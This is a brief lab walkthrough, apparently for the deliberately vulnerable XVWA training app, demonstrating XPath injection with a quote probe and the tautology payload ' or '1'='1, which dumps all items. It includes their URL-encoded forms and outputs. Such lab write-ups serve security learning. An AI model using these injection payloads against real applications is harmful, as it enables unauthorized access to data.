# XPATH Injection

Paylaod: `search=1&submit=`
Output: ID: 1, Item: Affogato

Input: `'`
Payload: search=%27&submit=
Output: Item Not Found

Input: ' or '1'='1
Payload: search=%27+or+%271%27%3D%271&submit=
Output: All Items are shown

## References
https://github.com/rudSarkar/xvwa-solution/blob/master/XPATH-injection-xvwa.md
